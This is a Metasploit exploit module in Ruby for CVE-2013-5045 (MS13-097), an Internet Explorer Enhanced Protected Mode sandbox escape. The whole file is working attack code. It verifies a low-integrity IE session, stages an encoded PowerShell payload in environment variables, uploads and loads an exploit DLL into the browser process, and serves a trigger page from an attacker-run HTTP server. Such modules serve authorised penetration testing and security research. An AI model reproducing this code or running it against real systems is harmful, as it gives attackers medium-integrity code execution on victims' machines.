# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
require &#039;rex&#039;
require &#039;msf/core/exploit/exe&#039;
require &#039;msf/core/exploit/powershell&#039;
 
class Metasploit3 < Msf::Exploit::Local
  Rank = GreatRanking
 
  include Msf::Exploit::Powershell
  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::HttpServer
  include Msf::Post::Windows::Priv
 
  def initialize(info={})
    super( update_info( info,
      &#039;Name&#039;           => &#039;MS13-097 Registry Symlink IE Sandbox Escape&#039;,
      &#039;Description&#039;     => %q{
        This module exploits a vulnerability in Internet Explorer Sandbox which allows to
        escape the Enhanced Protected Mode and execute code with Medium Integrity. The
        vulnerability exists in the IESetProtectedModeRegKeyOnly function from the ieframe.dll
        component, which can be abused to force medium integrity IE to user influenced keys.
        By using registry symlinks it&#039;s possible force IE to add a policy entry in the registry
        and finally bypass Enhanced Protected Mode.
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;James Forshaw&#039;, # Vulnerability Discovery and original exploit code
          &#039;juan vazquez&#039; # metasploit module
        ],
      &#039;Platform&#039;       => [ &#039;win&#039; ],
      &#039;Stance&#039;         => Msf::Exploit::Stance::Aggressive,
      &#039;Targets&#039;         =>
        [
          [ &#039;IE 8 - 11&#039;, { } ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => "Dec 10 2013",
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2013-5045&#039;],
          [&#039;MSB&#039;, &#039;MS13-097&#039;],
          [&#039;BID&#039;, &#039;64115&#039;],
          [&#039;URL&#039;, &#039;https://github.com/tyranid/IE11SandboxEscapes&#039;]
        ]
    ))
 
    register_options(
      [
        OptInt.new(&#039;DELAY&#039;, [true, &#039;Time that the HTTP Server will wait for the payload request&#039;, 10])
      ])
  end
 
  def exploit
    print_status("Running module against #{sysinfo[&#039;Computer&#039;]}") unless sysinfo.nil?
 
    mod_handle = session.railgun.kernel32.GetModuleHandleA(&#039;iexplore.exe&#039;)
    if mod_handle[&#039;return&#039;] == 0
      fail_with(Failure::NotVulnerable, "Not running inside an Internet Explorer process")
    end
 
    unless get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Failure::NotVulnerable, "Not running at Low Integrity")
    end
 
    begin
      Timeout.timeout(datastore[&#039;DELAY&#039;]) { super }
    rescue Timeout::Error
    end
 
    session.railgun.kernel32.SetEnvironmentVariableA("PSH_CMD", nil)
    session.railgun.kernel32.SetEnvironmentVariableA("HTML_URL", nil)
  end
 
  def primer
    cmd = cmd_psh_payload(payload.encoded).gsub(&#039;%COMSPEC% /B /C start powershell.exe &#039;,&#039;&#039;).strip
    session.railgun.kernel32.SetEnvironmentVariableA("PSH_CMD", cmd)
 
    html_uri = "#{get_uri}/#{rand_text_alpha(4 + rand(4))}.html"
    session.railgun.kernel32.SetEnvironmentVariableA("HTML_URL", html_uri)
 
    temp = get_env(&#039;TEMP&#039;)
 
    print_status("Loading Exploit Library...")
 
    session.core.load_library(
      &#039;LibraryFilePath&#039; => ::File.join(Msf::Config.data_directory, "exploits", "CVE-2013-5045", "CVE-2013-5045.dll"),
      &#039;TargetFilePath&#039;  => temp +  "\\CVE-2013-5045.dll",
      &#039;UploadLibrary&#039;   => true,
      &#039;Extension&#039;       => false,
      &#039;SaveToDisk&#039;      => false
    )
  end
 
  def on_request_uri(cli, request)
    if request.uri =~ /\.html$/
      print_status("Sending window close html...")
      close_html = <<-eos
<html>
<body>
<script>
window.open(&#039;&#039;, &#039;_self&#039;, &#039;&#039;);
window.close();
</script>
</body>
</html>
      eos
      send_response(cli, close_html, { &#039;Content-Type&#039; => &#039;text/html&#039; })
    else
      send_not_found(cli)
    end
  end
 
end

